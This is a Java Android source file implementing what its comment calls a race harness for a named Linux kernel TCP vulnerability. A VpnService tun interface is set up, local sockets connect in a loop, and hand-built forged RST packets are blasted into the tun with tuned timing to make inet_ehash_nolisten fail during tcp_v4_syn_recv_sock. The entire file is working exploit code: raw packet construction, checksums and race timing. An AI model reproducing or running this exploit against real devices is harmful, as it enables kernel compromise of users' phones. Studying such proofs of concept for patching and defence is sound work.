package com.mini;

import android.content.Intent;
import android.net.VpnService;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.FileOutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Dual-path race harness for CVE-2026-98432.
 *
 * CPU A: a real socket connects to one of our own addresses, so the kernel
 *        delivers the packet locally inside the connect() syscall. The ACK
 *        that drives tcp_v4_syn_recv_sock is therefore produced on a normal
 *        syscall path, not on the tun softirq path.
 *
 * CPU B: forged RSTs are written into the tun. tcp_check_req() drops the
 *        request socket for any RST without a sequence test, so an RST that
 *        lands during syn_recv_sock makes inet_ehash_nolisten() fail.
 */
public class MiniVpn extends VpnService implements Runnable {

    static final String TAG = "MiniVpn";
    static final String IP = "10.7.7.1";
    static final int PORT = 47777;
    static final int BASE_SPORT = 40000;
    static final int SPORT_RANGE = 15000;

    static volatile String status = "idle";
    static final AtomicLong rounds = new AtomicLong();
    static final AtomicLong connOk = new AtomicLong();
    static final AtomicLong connRst = new AtomicLong();

    private ParcelFileDescriptor pfd;
    private FileOutputStream fos;
    private volatile boolean running = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (running) {
            return START_STICKY;
        }
        try {
            Builder b = new Builder();
            b.setSession("mini");
            b.addAddress(IP, 32);
            b.addRoute("10.7.7.0", 24);
            pfd = b.establish();
            if (pfd == null) {
                status = "establish null";
                return START_STICKY;
            }
            fos = new FileOutputStream(pfd.getFileDescriptor());
            running = true;
            new Thread(this, "driver").start();
            status = "running";
        } catch (Throwable t) {
            status = "start err " + t;
            Log.e(TAG, "start", t);
        }
        return START_STICKY;
    }

    @Override
    public void run() {
        startListener();
        sleep(200);
        loop();
    }

    private void startListener() {
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ServerSocket ss = new ServerSocket();
                    ss.setReuseAddress(true);
                    ss.bind(new InetSocketAddress(InetAddress.getByName(IP), PORT), 64);
                    while (running) {
                        Socket s = ss.accept();
                        s.close();
                    }
                } catch (Throwable ex) {
                    status = "listener " + ex;
                }
            }
        }, "listen");
        t.start();
    }

    private void loop() {
        int i = 0;
        while (running) {
            i++;
            final int sport = BASE_SPORT + (i % SPORT_RANGE);
            final int offUs = (i % 24) * 40;

            Thread t = new Thread(new Runnable() {
                @Override
                public void run() {
                    blast(sport, offUs);
                }
            }, "rst");
            t.start();

            Socket c = new Socket();
            try {
                c.setReuseAddress(true);
                c.bind(new InetSocketAddress(InetAddress.getByName(IP), sport));
                c.connect(new InetSocketAddress(IP, PORT), 120);
                connOk.incrementAndGet();
            } catch (Throwable ex) {
                connRst.incrementAndGet();
            } finally {
                try { c.close(); } catch (Throwable ignored) { }
            }
            rounds.incrementAndGet();
            sleep(1);
        }
    }

    private void blast(int sport, int offUs) {
        long t0 = System.nanoTime();
        while (((System.nanoTime() - t0) / 1000L) < offUs) {
            // spin until the SYN has had time to create the request sock
        }
        byte[] pkt = buildRst(sport);
        for (int k = 0; k < 120; k++) {
            try {
                fos.write(pkt);
            } catch (Throwable t) {
                return;
            }
        }
    }

    private byte[] buildRst(int sport) {
        byte[] p = new byte[40];
        int addr = toInt(IP);

        p[0] = 0x45;
        put16(p, 2, 40);
        put16(p, 4, (int) (System.nanoTime() & 0xffff));
        put16(p, 6, 0x4000);
        p[8] = 64;
        p[9] = 6;
        put32(p, 12, addr);
        put32(p, 16, addr);
        put16(p, 10, csum(p, 0, 20, 0));

        put16(p, 20, sport);
        put16(p, 22, PORT);
        put32(p, 24, (int) System.nanoTime());
        put32(p, 28, 0);
        p[32] = 0x50;
        p[33] = 0x04;
        put16(p, 34, 0);
        put16(p, 36, 0);
        put16(p, 38, 0);

        int sum = ((addr >> 16) & 0xffff) + (addr & 0xffff);
        sum += ((addr >> 16) & 0xffff) + (addr & 0xffff);
        sum += 6 + 20;
        put16(p, 36, csum(p, 20, 20, sum));
        return p;
    }

    static int toInt(String s) {
        String[] a = s.split("\\.");
        return ((Integer.parseInt(a[0]) & 0xff) << 24)
                | ((Integer.parseInt(a[1]) & 0xff) << 16)
                | ((Integer.parseInt(a[2]) & 0xff) << 8)
                | (Integer.parseInt(a[3]) & 0xff);
    }

    static void put16(byte[] b, int o, int v) {
        b[o] = (byte) ((v >> 8) & 0xff);
        b[o + 1] = (byte) (v & 0xff);
    }

    static void put32(byte[] b, int o, int v) {
        b[o] = (byte) ((v >> 24) & 0xff);
        b[o + 1] = (byte) ((v >> 16) & 0xff);
        b[o + 2] = (byte) ((v >> 8) & 0xff);
        b[o + 3] = (byte) (v & 0xff);
    }

    static int csum(byte[] b, int off, int len, int init) {
        long s = init & 0xffffffffL;
        for (int i = 0; i < len; i += 2) {
            int hi = b[off + i] & 0xff;
            int lo = (i + 1 < len) ? (b[off + i + 1] & 0xff) : 0;
            s += (hi << 8) | lo;
        }
        while ((s >> 16) != 0) {
            s = (s & 0xffff) + (s >> 16);
        }
        return (int) (~s) & 0xffff;
    }

    static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (Throwable ignored) { }
    }
}
